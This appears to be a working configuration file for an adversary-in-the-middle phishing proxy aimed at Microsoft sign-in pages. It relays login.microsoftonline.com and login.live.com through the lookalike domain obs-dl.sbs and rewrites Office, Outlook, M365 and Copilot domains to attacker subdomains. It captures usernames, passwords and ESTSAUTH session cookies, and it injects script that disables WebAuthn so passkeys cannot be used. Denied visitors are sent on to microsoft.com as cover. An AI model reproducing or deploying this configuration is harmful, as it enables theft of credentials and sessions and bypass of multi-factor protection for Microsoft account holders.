version: "0.0"



global:
  impersonate:
    enabled: true
    retain_ua: true
  access:
    mode: "public"
    on_deny: "https://microsoft.com"



login.microsoftonline.com:
  to: "obs-dl.sbs"
  capture:
    - name: "username"
      method: "POST"
      path: "/common/GetCredentialType"
      engine: "json"
      find: "username"
      from: "request_body"

    - name: "password"
      method: "POST"
      path: "/common/login"
      engine: "form"
      find: "passwd"
      from: "request_body"

    - name: "session_token"
      method: "GET"
      path: ".*"
      engine: "cookie"
      find: "ESTSAUTH"
      from: "cookie"
      required: false

    - name: "session_token_persistent"
      method: "GET"
      path: ".*"
      engine: "cookie"
      find: "ESTSAUTHPERSISTENT"
      from: "cookie"
      required: false

  rewrite:
    - name: "rewrite_login_domain"
      find: "login\\.microsoftonline\\.com"
      replace: "obs-dl.sbs"
      from: "response_body"

    - name: "rewrite_login_live"
      find: "login\\.live\\.com"
      replace: "live.obs-dl.sbs"
      from: "response_body"

    - name: "rewrite_aadcdn"
      find: "aadcdn\\.msftauth\\.net"
      replace: "aadcdn.obs-dl.sbs"
      from: "response_body"

    - name: "rewrite_logincdn"
      find: "logincdn\\.msftauth\\.net"
      replace: "logincdn.obs-dl.sbs"
      from: "response_body"

    - name: "rewrite_msauth"
      find: "aadcdn\\.msauth\\.net"
      replace: "msauth.obs-dl.sbs"
      from: "response_body"

    - name: "rewrite_office"
      find: "www\\.office\\.com"
      replace: "office.obs-dl.sbs"
      from: "response_body"

    - name: "rewrite_loginmicrosoft"
      find: "login\\.microsoft\\.com"
      replace: "loginmicrosoft.obs-dl.sbs"
      from: "response_body"

    - name: "rewrite_account_live"
      find: "account\\.live\\.com"
      replace: "account-live.obs-dl.sbs"
      from: "response_body"

    - name: "rewrite_m365"
      find: "m365\\.cloud\\.microsoft"
      replace: "m365.obs-dl.sbs"
      from: "response_body"

    - name: "rewrite_mssso_copilot_ms"
      find: "ms-sso\\.copilot\\.microsoft\\.com"
      replace: "ms-sso.obs-dl.sbs"
      from: "response_body"

    - name: "rewrite_mssso_copilot"
      find: "ms-sso\\.copilot\\.com"
      replace: "ms-sso-c.obs-dl.sbs"
      from: "response_body"

    - name: "rewrite_outlook365"
      find: "outlook\\.office365\\.com"
      replace: "outlook.obs-dl.sbs"
      from: "response_body"

    - name: "rewrite_outlook_office"
      find: "outlook\\.office\\.com"
      replace: "outlook-office.obs-dl.sbs"
      from: "response_body"

    - name: "rewrite_substrate"
      find: "substrate\\.office\\.com"
      replace: "substrate.obs-dl.sbs"
      from: "response_body"

    - name: "disable_webauthn"
      find: "(?i)<head>"
      replace: "<head><script>Object.defineProperty(navigator,'credentials',{get:function(){return{get:function(){return Promise.reject(new DOMException('not allowed','NotAllowedError'))},create:function(){return Promise.reject(new DOMException('not allowed','NotAllowedError'))},preventSilentAccess:function(){return Promise.resolve()},store:function(){return Promise.resolve()}}}});Object.defineProperty(window,'PublicKeyCredential',{get:function(){return undefined}});</script>"
      from: "response_body"



login.live.com:
  to: "live.obs-dl.sbs"
